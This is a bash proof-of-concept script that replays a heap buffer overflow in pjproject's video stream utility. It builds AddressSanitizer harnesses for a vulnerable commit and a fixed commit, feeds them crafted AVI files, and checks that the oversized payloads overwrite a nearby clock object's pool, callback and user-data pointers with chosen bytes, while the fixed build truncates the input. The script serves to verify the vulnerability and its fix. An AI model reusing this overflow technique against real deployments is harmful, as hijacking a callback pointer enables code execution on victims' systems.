#!/usr/bin/env bash
# W243 replay: shipped vid_streamutil.c allocation order puts a live,
# pointer-bearing pjmedia_clock at frame+48. Chosen AVI payload overwrites
# its pool/callback/user_data words; fixed and safe controls stay identical.
# Build the pinned trees first with real/build-real.sh.
set -u
cd "$(dirname "$0")/.."

T=x86_64-pc-linux-gnu
VULN=src/full/pjproject-c1ea7648fb53f945493972a23133b9e0d3e4a1fe
FIXED=src/full/pjproject-7ecc6584969a923c4190b6912afbf5952b5a4b9f
PASS=0
FAIL=0

compile() {
    name=$1; root=$2
    gcc -fsanitize=address -g -O0 -fno-omit-frame-pointer \
        -DPJ_AUTOCONF=1 -DPJMEDIA_HAS_VIDEO=1 \
        -I"$root/pjlib/include" -I"$root/pjlib-util/include" \
        -I"$root/pjmedia/include" -I"$root/pjnath/include" \
        -I"$root/pjsip/include" real/clock-driver.c -o "real/driver-clock-$name" \
        -Wl,--start-group \
        "$root/pjmedia/lib/libpjmedia-$T.a" \
        "$root/pjmedia/lib/libpjmedia-videodev-$T.a" \
        "$root/pjmedia/lib/libpjmedia-codec-$T.a" \
        "$root/pjmedia/lib/libpjsdp-$T.a" \
        "$root/pjnath/lib/libpjnath-$T.a" \
        "$root/pjlib-util/lib/libpjlib-util-$T.a" \
        "$root/pjlib/lib/libpj-$T.a" -Wl,--end-group -lm -pthread -luuid
    echo "COMPILE clock-$name rc=$?"
}

run() {
    name=$1; avi=$2; log=$3
    mkdir -p "real/out-$name"
    ASAN_OPTIONS=detect_leaks=0:symbolize=1 \
        "./real/driver-clock-$name" "real/$avi" > "real/out-$name/$log" 2>&1
    rc=$?
    echo "RUN $name $avi clock rc=$rc log=real/out-$name/$log"
    grep -E -m1 'CLOCK_ALLOC|CLOCK_BEFORE|CLOCK_AFTER|PULL_DONE|FAIL' \
        "real/out-$name/$log" || true
}

check() {
    label=$1; file=$2; pattern=$3
    if grep -q "$pattern" "$file"; then
        echo "PASS $label"
        PASS=$((PASS + 1))
    else
        echo "FAIL $label (missing: $pattern)"
        FAIL=$((FAIL + 1))
    fi
}
check_same() {
    label=$1; file=$2
    fields_before=$(grep -m1 '^CLOCK_BEFORE ' "$file" || true)
    fields_after=$(grep -m1 '^CLOCK_AFTER ' "$file" || true)
    bytes_before=$(grep -m1 '^CLOCK_BYTES_BEFORE:' "$file" || true)
    bytes_after=$(grep -m1 '^CLOCK_BYTES_AFTER:' "$file" || true)
    if [ -n "$fields_before" ] && [ "${fields_before#CLOCK_BEFORE }" = "${fields_after#CLOCK_AFTER }" ] \
       && [ "${bytes_before#CLOCK_BYTES_BEFORE:}" = "${bytes_after#CLOCK_BYTES_AFTER:}" ]; then
        echo "PASS $label"
        PASS=$((PASS + 1))
    else
        echo "FAIL $label (clock fields or bytes changed)"
        FAIL=$((FAIL + 1))
    fi
}

python3 real/make_avi.py real/attack64.avi 64
python3 real/make_avi.py real/attack512.avi 512
python3 real/make_avi.py real/safe48.avi 48

compile vuln "$VULN"
run vuln attack64.avi  clock-vuln-attack64.log
run vuln attack512.avi clock-vuln-attack512.log
run vuln safe48.avi    clock-vuln-safe48.log

compile fixed "$FIXED"
run fixed attack64.avi clock-fixed-attack64.log
run fixed safe48.avi   clock-fixed-safe48.log

V=real/out-vuln
F=real/out-fixed
check 'clock adjacent in shipped order'  "$V/clock-vuln-attack64.log"  'CLOCK_ALLOC delta=48'
check 'attack64 chosen bytes'            "$V/clock-vuln-attack64.log"  'CLOCK_BYTES_AFTER:4d495348452d504a50524f4a45435421'
check 'attack64 clock pool pointer'      "$V/clock-vuln-attack64.log"  'CLOCK_AFTER pool=0x4a502d454853494d'
check 'attack64 pull'                    "$V/clock-vuln-attack64.log"  'PULL_DONE status=0 frame.size=64'
check 'attack512 chosen callback'        "$V/clock-vuln-attack512.log" 'CLOCK_AFTER pool=0x4a502d454853494d cb=0x4a502d454853494d user=0x215443454a4f5250'
check 'attack512 pull'                   "$V/clock-vuln-attack512.log" 'PULL_DONE status=0 frame.size=512'
check_same 'vuln safe unchanged'         "$V/clock-vuln-safe48.log"
check 'fixed clamp logged'               "$F/clock-fixed-attack64.log" 'exceeds frame buffer (48), truncating'
check_same 'fixed attack64 unchanged'    "$F/clock-fixed-attack64.log"
check_same 'fixed safe unchanged'        "$F/clock-fixed-safe48.log"

echo "TOTAL: $PASS PASS / $FAIL FAIL"
echo "== hashes =="
sha256sum real/clock-driver.c real/run-clock.sh real/attack64.avi real/attack512.avi real/safe48.avi
